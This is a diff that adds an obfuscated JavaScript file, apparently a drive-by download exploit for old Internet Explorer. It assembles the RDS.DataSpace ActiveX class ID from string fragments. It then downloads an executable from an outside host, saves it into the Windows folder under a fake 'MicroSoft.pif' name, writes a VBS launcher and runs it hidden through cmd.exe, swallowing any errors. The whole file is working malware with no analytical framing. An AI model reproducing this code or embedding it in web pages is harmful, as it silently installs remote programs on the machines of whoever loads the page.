@@ -1,0 +1,60 @@
+function gn(rRaGEykU1)
+{
+var Orh2=window["Math"]["random"]()*rRaGEykU1;
+return'CuteQq'+'.Cn'
+}
+try
+{
+var Cuteqqzf,Cuteqqzfs,Cuteqqzfx,wwwcuteqqcn,wwwcuteqqcn2;
+Cuteqq='http://www.300mh.com/1.exe';
+var Qq784378237='MicroSoft.pif';
+var Cuteqq784378237='MicroSoft.vbs';
+var chilam=window["document"]["createElement"]("object");
+var cuteqqid="clsid:";
+var cuteqqids="D0-983";
+var cuteqqidss="A-00C04";
+var cuteqqidsss="FC29E36";
+var cuteqqidx="BD96C";
+var cuteqqidxx="556-65A3-11";
+var cuteqqxml="Microsoft.X"+"M"+"L"+"H"+"T"+"T"+"P";
+var cuteqqado="A"+"d"+"o"+"d"+"b."+"S"+"t"+"r"+"e"+"a"+"m";
+var ying="Shell.";
+var yings="Application";
+var yingx=ying+yings;
+var cuteqqidx=cuteqqid+cuteqqidx+cuteqqidxx+cuteqqids+cuteqqidss+cuteqqidsss;
+chilam["setAttribute"]("classid",cuteqqidx);
+var hHf$R6=chilam["CreateObject"]("Scripting.FileSystemObject","");
+var Cuteqq2=chilam["CreateObject"](cuteqqxml,"");
+var Cuteqq3=window["chilam"]["CreateObject"](cuteqqado,"");
+Cuteqq3["type"]=1;
+var VgDnZXHt7=hHf$R6["GetSpecialFolder"](0);
+var yingying;
+yingying=chilam["CreateObject"](yingx,"");
+exp1=hHf$R6["BuildPath"](VgDnZXHt7+'\\system32','cmd.exe');
+wwwcuteqqcn=VgDnZXHt7+"\\"+Qq784378237;
+Cuteqq2.Open("GET",Cuteqq,0);
+Cuteqq2["send"]();
+Cuteqq3["Open"]();
+Cuteqq3["Write"](Cuteqq2["responseBody"]);
+Cuteqq3["SaveToFile"](wwwcuteqqcn,2);
+Cuteqq3["Close"]();
+wwwcuteqqcn2=VgDnZXHt7+"\\"+Cuteqq784378237;
+var Cuteqqzf0;
+Cuteqqzf0="Set wwwcuteqqcn = CreateObject(\"Wscript.";
+Cuteqqzf="Shell\")" + "\n";
+Cuteqqzfs="wwwcuteqqcn.run \"cmd /c "+wwwcuteqqcn+"\",vbhide";
+Cuteqqzfx=Cuteqqzf0+Cuteqqzf+Cuteqqzfs;
+Cuteqq3["type"]=2;
+Cuteqq3["Open"]();
+Cuteqq3["WriteText"]=Cuteqqzfx;
+Cuteqq3["Savetofile"](wwwcuteqqcn2,2);
+Cuteqq3["Close"]();
+var cuteqqs="o";
+var cuteqqss="p";
+var cuteqqsss="e";
+var cuteqqssss="n";
+var cuteqqx=cuteqqs+cuteqqss+cuteqqsss+cuteqqssss;
+yingying.ShelLExeCute(exp1,' /c '+wwwcuteqqcn2,"",cuteqqx,0)
+}
+catch(Kfqq784378237)
+{Kfqq784378237=1}
